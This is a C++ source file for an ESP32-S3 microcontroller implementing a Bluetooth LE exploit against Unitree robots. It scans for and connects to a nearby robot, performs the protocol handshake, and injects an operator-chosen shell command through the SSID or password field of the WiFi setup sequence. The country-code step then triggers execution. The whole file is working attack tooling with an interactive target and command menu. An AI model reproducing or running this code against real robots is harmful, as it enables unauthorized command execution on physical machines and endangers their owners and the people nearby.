/*
 * Unitree Robot Exploitation Functions
 * Optimized for Seeed XIAO ESP32-S3
 * Implements the BLE connection and command injection exploit
 */

// Notification callback for BLE
static void notifyCallback(BLERemoteCharacteristic* pBLERemoteCharacteristic,
                          uint8_t* pData, size_t length, bool isNotify) {
    std::vector<uint8_t> encryptedData(pData, pData + length);
    std::vector<uint8_t> decrypted = decryptData(encryptedData);
    
    if (decrypted.size() < 5 || decrypted[0] != 0x51) {
        styledPrint("[-] Corrupted notification packet", true);
        return;
    }
    
    uint8_t responseType = decrypted[2];
    
    // Handle serial number chunks (instruction 2)
    if (responseType == 0x02) {
        uint8_t chunkIndex = decrypted[3];
        uint8_t totalChunks = decrypted[4];
        
        std::vector<uint8_t> chunkData(decrypted.begin() + 5, decrypted.end() - 1);
        serialChunks[chunkIndex] = chunkData;
        
        styledPrint("Received serial chunk " + String(chunkIndex) + "/" + String(totalChunks), true);
        
        // Check if we have all chunks
        if (serialChunks.size() == totalChunks) {
            String serialNumber = "";
            for (uint8_t i = 1; i <= totalChunks; i++) {
                for (uint8_t byte : serialChunks[i]) {
                    if (byte != 0) serialNumber += (char)byte;
                }
            }
            styledPrint("Serial number: " + serialNumber);
            serialChunks.clear();
        }
    } else {
        // Store general response
        receivedNotification = decrypted;
        notificationReceived = true;
    }
}

bool connectToDevice(const UnitreeDevice& device) {
    styledPrint("Connecting to " + device.name + " (" + device.address + ")");
    
    if (pClient) {
        pClient->disconnect();
        delete pClient;
        pClient = nullptr;
    }
    
    pClient = BLEDevice::createClient();
    BLEAddress address(device.address.c_str());
    
    if (!pClient->connect(address)) {
        styledPrint("[-] Failed to connect to device");
        return false;
    }
    
    deviceConnected = true;
    styledPrint("Connected successfully", true);
    
    // Get the service
    BLERemoteService* pRemoteService = pClient->getService(BLEUUID(UNITREE_SERVICE_UUID));
    if (!pRemoteService) {
        styledPrint("[-] Failed to find Unitree service");
        pClient->disconnect();
        return false;
    }
    
    // Get characteristics
    pWriteChar = pRemoteService->getCharacteristic(BLEUUID(CUSTOM_CHAR_UUID_2));
    pNotifyChar = pRemoteService->getCharacteristic(BLEUUID(CUSTOM_CHAR_UUID));
    
    if (!pWriteChar || !pNotifyChar) {
        styledPrint("[-] Failed to find required characteristics");
        pClient->disconnect();
        return false;
    }
    
    // Register for notifications
    if (pNotifyChar->canNotify()) {
        pNotifyChar->registerForNotify(notifyCallback);
        styledPrint("Notification handler registered", true);
    }
    
    return true;
}

bool waitForNotification(uint32_t timeoutMs = 5000) {
    notificationReceived = false;
    unsigned long startTime = millis();
    
    while (!notificationReceived && (millis() - startTime) < timeoutMs) {
        delay(10);
    }
    
    return notificationReceived;
}

bool sendHandshake() {
    styledPrint("Sending handshake: " + HANDSHAKE_CONTENT, true);
    
    std::vector<uint8_t> handshakeBytes(HANDSHAKE_CONTENT.begin(), HANDSHAKE_CONTENT.end());
    std::vector<uint8_t> dataBytes = {0, 0};
    dataBytes.insert(dataBytes.end(), handshakeBytes.begin(), handshakeBytes.end());
    
    std::vector<uint8_t> packet = createPacket(1, dataBytes);
    pWriteChar->writeValue(packet.data(), packet.size());
    
    if (!waitForNotification()) {
        styledPrint("[-] Handshake timeout");
        return false;
    }
    
    if (!genericResponseValidator(receivedNotification, 1)) {
        styledPrint("[-] Handshake failed");
        return false;
    }
    
    styledPrint("Handshake successful");
    return true;
}

bool getSerialNumber() {
    styledPrint("Getting serial number...", true);
    
    std::vector<uint8_t> packet = createPacket(2, {0});
    pWriteChar->writeValue(packet.data(), packet.size());
    
    // Wait a bit longer for serial number chunks
    delay(1000);
    
    return true; // Serial number is handled in notification callback
}

bool initializeWifi(uint8_t mode = 2) {
    styledPrint("Initializing WiFi mode " + String(mode == 1 ? "AP" : "STA"), true);
    
    std::vector<uint8_t> packet = createPacket(3, {mode});
    pWriteChar->writeValue(packet.data(), packet.size());
    
    if (!waitForNotification()) {
        styledPrint("[-] WiFi initialization timeout");
        return false;
    }
    
    if (!genericResponseValidator(receivedNotification, 3)) {
        styledPrint("[-] WiFi initialization failed");
        return false;
    }
    
    return true;
}

bool sendChunkedData(uint8_t instruction, const String& data) {
    std::vector<uint8_t> dataBytes(data.begin(), data.end());
    uint8_t totalChunks = (dataBytes.size() + CHUNK_SIZE - 1) / CHUNK_SIZE;
    
    styledPrint("Sending " + String(totalChunks) + " chunks for instruction " + String(instruction), true);
    
    for (uint8_t i = 0; i < totalChunks; i++) {
        size_t start = i * CHUNK_SIZE;
        size_t end = min((size_t)(start + CHUNK_SIZE), dataBytes.size());
        
        std::vector<uint8_t> chunk(dataBytes.begin() + start, dataBytes.begin() + end);
        std::vector<uint8_t> packetData = {(uint8_t)(i + 1), totalChunks};
        packetData.insert(packetData.end(), chunk.begin(), chunk.end());
        
        std::vector<uint8_t> packet = createPacket(instruction, packetData);
        pWriteChar->writeValue(packet.data(), packet.size());
        
        delay(100); // Small delay between chunks
        
        // Only wait for response on last chunk
        if (i + 1 == totalChunks) {
            if (!waitForNotification()) {
                styledPrint("[-] Chunk transmission timeout");
                return false;
            }
            
            if (!genericResponseValidator(receivedNotification, instruction)) {
                styledPrint("[-] Chunk transmission failed");
                return false;
            }
        }
    }
    
    return true;
}

bool setSSID(const String& ssid) {
    styledPrint("Setting SSID: " + ssid, true);
    return sendChunkedData(4, ssid);
}

bool setPassword(const String& password) {
    styledPrint("Setting password", true);
    return sendChunkedData(5, password);
}

bool setCountryCode() {
    styledPrint("Setting country code: " + COUNTRY_CODE, true);
    
    std::vector<uint8_t> countryBytes(COUNTRY_CODE.begin(), COUNTRY_CODE.end());
    countryBytes.push_back(0); // Null terminator
    
    std::vector<uint8_t> dataBytes = {1};
    dataBytes.insert(dataBytes.end(), countryBytes.begin(), countryBytes.end());
    
    std::vector<uint8_t> packet = createPacket(6, dataBytes);
    pWriteChar->writeValue(packet.data(), packet.size());
    
    if (!waitForNotification()) {
        styledPrint("[-] Country code timeout");
        return false;
    }
    
    if (!genericResponseValidator(receivedNotification, 6)) {
        styledPrint("[-] Country code failed");
        return false;
    }
    
    styledPrint("Exploit triggered! Command should execute now.");
    return true;
}

bool exploitSequence(const String& ssid, const String& password) {
    styledPrint("Starting exploitation sequence");
    
    // Step 1: Handshake
    if (!sendHandshake()) {
        return false;
    }
    
    // Step 2: Get serial number (verification)
    getSerialNumber();
    
    // Step 3: Initialize WiFi
    if (!initializeWifi()) {
        return false;
    }
    
    // Step 4: Set SSID (injection point)
    if (!setSSID(ssid)) {
        return false;
    }
    
    // Step 5: Set password
    if (!setPassword(password)) {
        return false;
    }
    
    // Step 6: Set country code (trigger)
    if (!setCountryCode()) {
        return false;
    }
    
    styledPrint("Exploitation complete!");
    return true;
}

void selectAndExploitDevice() {
    // First show available devices
    std::vector<UnitreeDevice> allDevices = discoveredDevices;
    allDevices.insert(allDevices.end(), recentDevices.begin(), recentDevices.end());
    
    if (allDevices.empty()) {
        styledPrint("[-] No devices available. Run a scan first.");
        return;
    }
    
    // Remove duplicates
    for (auto it = allDevices.begin(); it != allDevices.end(); ++it) {
        for (auto it2 = it + 1; it2 != allDevices.end();) {
            if (it->address == it2->address) {
                it2 = allDevices.erase(it2);
            } else {
                ++it2;
            }
        }
    }
    
    Serial.println("\nAvailable devices:");
    for (size_t i = 0; i < allDevices.size(); i++) {
        Serial.println("  " + String(i + 1) + ". " + allDevices[i].name + 
                      " (" + allDevices[i].address + ")");
    }
    
    Serial.print("\n\033[1;32m[//] Select device (1-" + String(allDevices.size()) + "): \033[0m");
    
    // Wait for user input
    while (!Serial.available()) {
        delay(100);
    }
    
    int deviceChoice = Serial.parseInt();
    if (deviceChoice < 1 || deviceChoice > (int)allDevices.size()) {
        styledPrint("[-] Invalid device selection");
        return;
    }
    
    UnitreeDevice selectedDevice = allDevices[deviceChoice - 1];
    
    // Connect to device
    if (!connectToDevice(selectedDevice)) {
        return;
    }
    
    // Add to recent devices
    addRecentDevice(selectedDevice);
    
    // Show exploitation options
    Serial.println("\nExploitation options:");
    Serial.println("1. Command injection only (via SSID)");
    Serial.println("2. Command injection + WiFi config (via password)");
    Serial.println("3. WiFi configuration only (no injection)");
    
    Serial.print("\n\033[1;32m[//] Select option (1-3): \033[0m");
    
    while (!Serial.available()) {
        delay(100);
    }
    
    int exploitChoice = Serial.parseInt();
    
    String ssid = "";
    String password = "";
    String command = "";
    
    if (exploitChoice == 3) {
        // WiFi only
        Serial.print("\n\033[1;32m[//] Enter WiFi SSID: \033[0m");
        while (!Serial.available()) delay(100);
        ssid = Serial.readString();
        ssid.trim();
        
        Serial.print("\033[1;32m[//] Enter WiFi Password: \033[0m");
        while (!Serial.available()) delay(100);
        password = Serial.readString();
        password.trim();
    } else {
        // Show command options
        Serial.println("\nAvailable commands:");
        for (size_t i = 0; i < predefinedCmds.size(); i++) {
            Serial.println("  " + String(i + 1) + ". " + predefinedCmds[i].name + 
                          " - " + predefinedCmds[i].description);
        }
        Serial.println("  " + String(predefinedCmds.size() + 1) + ". Custom command");
        
        Serial.print("\n\033[1;32m[//] Select command (1-" + String(predefinedCmds.size() + 1) + "): \033[0m");
        
        while (!Serial.available()) delay(100);
        int cmdChoice = Serial.parseInt();
        
        if (cmdChoice >= 1 && cmdChoice <= (int)predefinedCmds.size()) {
            command = predefinedCmds[cmdChoice - 1].cmd;
            styledPrint("Selected: " + predefinedCmds[cmdChoice - 1].name);
        } else if (cmdChoice == (int)predefinedCmds.size() + 1) {
            Serial.print("\033[1;32m[//] Enter custom command: \033[0m");
            while (!Serial.available()) delay(100);
            command = Serial.readString();
            command.trim();
        } else {
            styledPrint("[-] Invalid command selection");
            if (pClient) pClient->disconnect();
            return;
        }
        
        if (exploitChoice == 1) {
            // Command via SSID
            ssid = buildPwn(command);
            password = "";
        } else if (exploitChoice == 2) {
            // Command via password + WiFi config
            Serial.print("\033[1;32m[//] Enter WiFi SSID: \033[0m");
            while (!Serial.available()) delay(100);
            ssid = Serial.readString();
            ssid.trim();
            
            Serial.print("\033[1;32m[//] Enter WiFi Password: \033[0m");
            while (!Serial.available()) delay(100);
            password = Serial.readString();
            password.trim();
            password += buildPwn(command);
        }
    }
    
    // Execute exploit
    styledPrint("Executing exploit...");
    bool success = exploitSequence(ssid, password);
    
    if (success) {
        styledPrint("Exploit completed successfully!");
    } else {
        styledPrint("[-] Exploit failed");
    }
    
    // Disconnect
    if (pClient) {
        pClient->disconnect();
        deviceConnected = false;
    }
}

void exploitDevice(const String& ssid, const String& password) {
    styledPrint("Starting WiFi configuration exploit...");
    styledPrint("Target SSID: " + ssid);
    
    if (!deviceConnected || !pWriteChar || !pNotifyChar) {
        styledPrint("[-] Device not properly connected");
        return;
    }
    
    // Send handshake
    std::vector<uint8_t> handshake = createPacket(0x01, 
        std::vector<uint8_t>(HANDSHAKE_CONTENT.begin(), HANDSHAKE_CONTENT.end()));
    
    std::vector<uint8_t> encrypted = encryptData(handshake);
    
    pWriteChar->writeValue(encrypted.data(), encrypted.size());
    if (!waitForNotification()) {
        styledPrint("[-] Handshake failed");
        return;
    }
    
    styledPrint("[+] Handshake successful");
    
    // Build and send WiFi configuration
    std::vector<uint8_t> wifiData;
    
    // Add SSID
    wifiData.insert(wifiData.end(), ssid.begin(), ssid.end());
    wifiData.push_back(0x00);  // Null terminator
    
    // Add password
    wifiData.insert(wifiData.end(), password.begin(), password.end());
    wifiData.push_back(0x00);  // Null terminator
    
    // Add country code
    wifiData.insert(wifiData.end(), COUNTRY_CODE.begin(), COUNTRY_CODE.end());
    wifiData.push_back(0x00);  // Null terminator
    
    std::vector<uint8_t> wifiPacket = createPacket(0x04, wifiData);
    std::vector<uint8_t> encryptedWifi = encryptData(wifiPacket);
    
    pWriteChar->writeValue(encryptedWifi.data(), encryptedWifi.size());
    if (!waitForNotification()) {
        styledPrint("[-] WiFi configuration failed");
        return;
    }
    
    styledPrint("[+] WiFi configuration sent successfully!");
    styledPrint("[+] Exploit payload delivered");
}
